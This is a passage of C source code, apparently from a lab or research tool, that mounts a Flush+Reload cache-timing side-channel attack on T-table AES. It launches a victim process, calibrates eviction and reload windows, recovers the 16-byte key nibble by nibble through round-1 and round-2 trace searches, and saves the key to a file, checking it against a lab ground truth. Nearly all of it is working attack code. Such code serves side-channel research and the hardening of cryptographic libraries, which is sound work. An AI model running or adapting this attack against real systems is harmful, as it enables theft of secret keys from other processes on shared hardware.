    uint8_t k0=(uint8_t)(high[0]<<4);

    uint8_t x=gf_mul2(Sbox2[p[8]^k8])^gf_mul3(Sbox2[p[13]^k13])^Sbox2[p[2]^k2]^Sbox2[p[7]^k7]^k4^k8^k0^Sbox2[k13]^0x01;

    return x>>4;
}

static int predict_group_T3(const uint8_t p[16],const uint8_t high[16],int k1_low,int k6_low,int k11_low,int k12_low){
    uint8_t k1=(uint8_t)((high[1]<<4)|k1_low);
    uint8_t k6=(uint8_t)((high[6]<<4)|k6_low);
    uint8_t k11=(uint8_t)((high[11]<<4)|k11_low);
    uint8_t k12=(uint8_t)((high[12]<<4)|k12_low);
    uint8_t k15=(uint8_t)(high[15]<<4);
    uint8_t k7=(uint8_t)(high[7]<<4);
    uint8_t k3=(uint8_t)(high[3]<<4);

    uint8_t x=gf_mul3(Sbox2[p[12]^k12])^Sbox2[p[1]^k1]^Sbox2[p[6]^k6]^gf_mul2(Sbox2[p[11]^k11])^k15^k11^k7^k3^Sbox2[k12];

    return x>>4;
}


//round-2 samples / search
typedef struct{
    uint8_t plaintext[16];

    double t0[16];
    double t1[16];
    double t2[16];
    double t3[16];
} round2_sample_t;

typedef enum{
    GROUP_T2,
    GROUP_T1,
    GROUP_T0,
    GROUP_T3
} second_round_group_t;

static void recover_low_group(second_round_group_t group,const uint8_t high[16],round2_sample_t *samples,int sample_count,int recovered_low[16]){
    int idx[4];
    int table;
    const char *label;

    switch(group){

        case GROUP_T2:
            idx[0]=0;idx[1]=5;idx[2]=10;idx[3]=15;
            table=2;
            label="T2 (K0 K5 K10 K15)";
            break;

        case GROUP_T1:
            idx[0]=3;idx[1]=4;idx[2]=9;idx[3]=14;
            table=1;
            label="T1 (K3 K4 K9 K14)";
            break;

        case GROUP_T0:
            idx[0]=2;idx[1]=7;idx[2]=8;idx[3]=13;
            table=0;
            label="T0 (K2 K7 K8 K13)";
            break;

        default:
            idx[0]=1;idx[1]=6;idx[2]=11;idx[3]=12;
            table=3;
            label="T3 (K1 K6 K11 K12)";
            break;
    }

    printf("\n[+] Second-round search: %s\n",label);

    double best_score=-1.0e300;
    int best_a=0;
    int best_b=0;
    int best_c=0;
    int best_d=0;

    for(int a=0;a<16;a++){
        for(int b=0;b<16;b++){
            for(int c=0;c<16;c++){
                for(int d=0;d<16;d++){
                    double score=0.0;

                    for(int s=0;s<sample_count;s++){
                        int line;
                        const double *arr;

                        switch(group){

                            case GROUP_T2:
                                line=predict_group_T2(samples[s].plaintext,high,a,b,c,d);
                                arr=samples[s].t2;
                                break;

                            case GROUP_T1:
                                line=predict_group_T1(samples[s].plaintext,high,a,b,c,d);
                                arr=samples[s].t1;
                                break;

                            case GROUP_T0:
                                line=predict_group_T0(samples[s].plaintext,high,a,b,c,d);
                                arr=samples[s].t0;
                                break;

                            default:
                                line=predict_group_T3(samples[s].plaintext,high,a,b,c,d);
                                arr=samples[s].t3;
                                break;
                        }

                        score+=arr[line];
                    }

                    if(score>best_score){
                        best_score=score;
                        best_a=a;
                        best_b=b;
                        best_c=c;
                        best_d=d;
                    }
                }
            }
        }
    }

    (void)table;

    recovered_low[idx[0]]=best_a;
    recovered_low[idx[1]]=best_b;
    recovered_low[idx[2]]=best_c;
    recovered_low[idx[3]]=best_d;

    printf(
        "    K%-2d=0x%X  K%-2d=0x%X  K%-2d=0x%X  K%-2d=0x%X  (score=%.2f)\n",
        idx[0],best_a,
        idx[1],best_b,
        idx[2],best_c,
        idx[3],best_d,
        best_score
    );
}


//phase 3 sample collection
//
//Collects a round-2 T-table trace exactly as before (evict round-1,
//wait for the calibrated post-round-2 point, reload all lines). After
//that capture, it additionally performs the round2->round3 eviction
//at phase4_evict_window, mirroring the round1->round2 eviction above
//with no new logic. This round-3 eviction is not read back or used
//for recovery -- it exists only so the round-2/round-3 window is
//actually exercised, matching the real pipeline
//(flush->round1->reload->flush->round2->reload->round3).
static void collect_round2_sample_windowed(void *ttable,control_block_t *control,uint64_t baseline[TOTAL_LINES],uint64_t evict_window,uint64_t reload_window,uint64_t phase4_evict_window,round2_sample_t *sample){
    random_plaintext(sample->plaintext);

    //first flush+reload eviction:
    //remove any stale cache state before the victim request.
    flush_all_lines(ttable);

    uint64_t t0=rdtsc_now();

    uint32_t request=issue_request_async(control,CONTROL_MODE_ROUND3_NOFLUSH,sample->plaintext);

    //wait for the automatically calibrated inter-round (1->2) point.
    //no victim-side synchronization is involved.
    busy_wait_until(t0,evict_window);

    //the attacker performs the round1->round2 eviction here.
    flush_all_lines(ttable);

    //wait until the automatically calibrated post-round-2 point.
    busy_wait_until(t0,reload_window);

    double raw[TOTAL_LINES];
    int order[TOTAL_LINES];
    shuffle_order(order,TOTAL_LINES);

    for(int i=0;i<TOTAL_LINES;i++){
        int line=order[i];

        uint64_t timing=reload_timing(line_address(ttable,line));

        raw[line]=timing_signal(baseline[line],timing);
    }

    //round2->round3 eviction: same construction as the round1->round2
    //eviction above, performed at the calibrated phase-4 window so the
    //attacker also exercises the gap between round 2 and round 3. This
    //happens after the round-2 reload has already been captured, so it
    //cannot affect round-2 recovery; round 3 itself is not sampled.
    if(phase4_evict_window>reload_window){
        busy_wait_until(t0,phase4_evict_window);
    }
    flush_all_lines(ttable);

    //finish the request before starting the next one (the victim
    //continues on into round 3 on its own).
    wait_for_response(control,request);

    //normalize each table independently, as in the working two-round attack.
    for(int table=0;table<4;table++){
        double mean=0.0;

        for(int line=0;line<16;line++){
            mean+=raw[table*16+line];
        }

        mean/=16.0;

        for(int line=0;line<16;line++){
            double value=raw[table*16+line]-mean;

            if(table==0){
                sample->t0[line]=value;
            } else if(table==1){
                sample->t1[line]=value;
            } else if(table==2){
                sample->t2[line]=value;
            } else {
                sample->t3[line]=value;
            }
        }
    }
}


//key output
static void write_key_file(const char *path,const uint8_t key[16]){
    FILE *fp=fopen(path,"w");
    if(fp==NULL)die("fopen key output");

    for(int i=0;i<16;i++){
        fprintf(fp,"%02x",key[i]);
    }

    fprintf(fp,"\n");
    fclose(fp);
}


//main
int main(int argc,char **argv){
    /*
     * argv[1] = victim program
     * argv[2] = AES library
     * argv[3] = attacker CPU
     * argv[4] = victim CPU
     * argv[5] = output key path
     *
     * Optional:
     *
     * argv[6]  = Phase-1 calibration traces
     * argv[7]  = Phase-2 repeats per high nibble
     * argv[8]  = Phase-3 traces
     * argv[9]  = attacker primitive calibration samples
     * argv[10] = operation-duration percentile
     * argv[11] = Round-2 completion percentile
     */

    const char *victim_program=argc>=2?argv[1]:VICTIM_PROGRAM_DEFAULT;
    const char *library_path=argc>=3?argv[2]:AES_LIBRARY_DEFAULT;
    int attacker_cpu=argc>=4?atoi(argv[3]):ATTACKER_CPU_DEFAULT;
    int victim_cpu=argc>=5?atoi(argv[4]):VICTIM_CPU_DEFAULT;
    const char *out_key_path=argc>=6?argv[5]:OUT_KEY_DEFAULT;

    int phase1_traces=argc>=7?parse_positive_int(argv[6],"phase1 calibration traces"):PHASE1_CALIB_TRACES_DEFAULT;
    int phase2_repeats=argc>=8?parse_positive_int(argv[7],"phase2 repeats per high nibble"):PHASE2_REPEATS_DEFAULT;
    int phase3_traces=argc>=9?parse_positive_int(argv[8],"phase3 traces"):PHASE3_TRACES_DEFAULT;
    int primitive_samples=argc>=10?parse_positive_int(argv[9],"primitive calibration samples"):PRIMITIVE_CALIB_SAMPLES_DEFAULT;
    double operation_percentile=argc>=11?parse_percentile(argv[10],"operation duration percentile"):OPERATION_DURATION_PERCENTILE_DEFAULT;
    double round2_reload_percentile=argc>=12?parse_percentile(argv[11],"round-2 reload percentile"):ROUND2_RELOAD_PERCENTILE_DEFAULT;

    set_cpu(attacker_cpu);

    //start victim
    pid_t victim_pid=start_victim(victim_program,library_path,victim_cpu);

    //map t-tables + control
    void *ttable=NULL;
    map_ttables(&ttable);

    control_block_t *control=open_control_block();

    //cache-line baseline
    uint64_t baseline[TOTAL_LINES];
    calibrate_miss_baseline(ttable,baseline);

    //phase 1a: measure attacker operation costs
    primitive_profile_t primitive;
    calibrate_attacker_primitives(ttable,primitive_samples,operation_percentile,&primitive);

    //phase 1b: measure victim timing
    timing_profile_t timing;
    memset(&timing,0,sizeof(timing));
    calibrate_phase_timing(control,phase1_traces,&timing);

    //select windows automatically
    attack_windows_t windows=choose_attack_windows(&timing,&primitive,round2_reload_percentile);

    print_attack_windows(&windows,&primitive,operation_percentile,round2_reload_percentile);

    //the timestamps are now discarded.
    //from this point onward the attack never reads the victim's round timestamp fields.
    free_timing_profile(&timing);

    //fail cleanly when no usable window exists
    //this is particularly important for no-sleep builds.
    //if the measured flush+reload operation cannot fit inside
    //the measured natural inter-round gap, do not pretend that
    //the resulting trace is a clean round-1/round-2 trace.
    //(the round-2/round-3 window, phase4, is not required for key
    //recovery, so it is not part of this fail-fast gate -- only
    //reported.)
    if(windows.phase2_coverage_percent<=0.0||windows.phase3_evict_coverage_percent<=0.0){

        fprintf(
            stderr,
            "\n[-] Runtime calibration found no usable fixed timing window.\n"
            "    The victim executes both rounds naturally, but the current\n"
            "    attacker-side operation is too long for the measured gap.\n"
            "    Use AES_SLEEP_MODE only as the lab-assisted comparison\n"
            "    build, or change the machine/affinity and recalibrate.\n"
        );

        terminate_victim(control,victim_pid);
        munmap(ttable,TTABLE_SIZE);
        shm_unlink(SHM_NAME);
        shm_unlink(CONTROL_SHM_NAME);

        return EXIT_FAILURE;
    }

    //phase 2: round-1 high-nibble recovery
    printf(
        "\n============================================================\n"
        "        PHASE 2: WINDOWED ROUND-1 HIGH-NIBBLE RECOVERY\n"
        "============================================================\n"
    );

    uint8_t high[16];

    for(int byte_index=0;byte_index<16;byte_index++){
        high[byte_index]=(uint8_t)recover_high_nibble_windowed(byte_index,ttable,control,baseline,windows.phase2_reload_window,phase2_repeats);
    }

    //phase 3: round-2 low-nibble recovery (+ round2->round3 eviction)
    printf(
        "\n============================================================\n"
        "        PHASE 3: WINDOWED ROUND-2 LOW-NIBBLE RECOVERY\n"
        "============================================================\n"
        "[+] Collecting %d windowed traces (pipeline runs through round 3)...\n",
        phase3_traces
    );

    round2_sample_t *samples=calloc((size_t)phase3_traces,sizeof(round2_sample_t));
    if(samples==NULL)die("calloc samples");

    for(int trace=0;trace<phase3_traces;trace++){
        collect_round2_sample_windowed(ttable,control,baseline,windows.phase3_evict_window,windows.phase3_reload_window,windows.phase4_evict_window,&samples[trace]);

        if((trace+1)%200==0||trace+1==phase3_traces){
            printf("\r[+] Traces: %d/%d",trace+1,phase3_traces);
            fflush(stdout);
        }
    }

    printf("\n");

    //four 65536-candidate searches
    int low[16];
    memset(low,0,sizeof(low));

    recover_low_group(GROUP_T2,high,samples,phase3_traces,low);
    recover_low_group(GROUP_T1,high,samples,phase3_traces,low);
    recover_low_group(GROUP_T0,high,samples,phase3_traces,low);
    recover_low_group(GROUP_T3,high,samples,phase3_traces,low);

    free(samples);

    //combine nibbles
    uint8_t recovered_key[16];

    for(int i=0;i<16;i++){
        recovered_key[i]=(uint8_t)((high[i]<<4)|(low[i]&0x0f));
    }

    //print recovered key
    printf(
        "\n============================================================\n"
        "                      RECOVERED KEY\n"
        "============================================================\n"
        "[+] Key: "
    );

    for(int i=0;i<16;i++){
        printf("%02x",recovered_key[i]);
    }

    printf("\n");

    //lab verification
    //this is read only after recovery.
    //it is not part of the key search.
    uint8_t real_key[16];

    for(int i=0;i<16;i++){
        real_key[i]=control->real_key[i];
    }

    int matches=0;

    for(int i=0;i<16;i++){
        if(recovered_key[i]==real_key[i]){
            matches++;
        }
    }

    printf("[+] Ground truth (verification only, not used in recovery): ");

    for(int i=0;i<16;i++){
        printf("%02x",real_key[i]);
    }

    printf("\n[+] Bytes matching ground truth: %d / 16\n",matches);

    //save
    write_key_file(out_key_path,recovered_key);

    printf("[+] Saved to %s\n",out_key_path);

    //cleanup
    terminate_victim(control,victim_pid);
    munmap(ttable,TTABLE_SIZE);
    shm_unlink(SHM_NAME);
    shm_unlink(CONTROL_SHM_NAME);

    printf(
        "\n============================================================\n"
        "                         DONE\n"
        "============================================================\n"
    );

    return EXIT_SUCCESS;
}
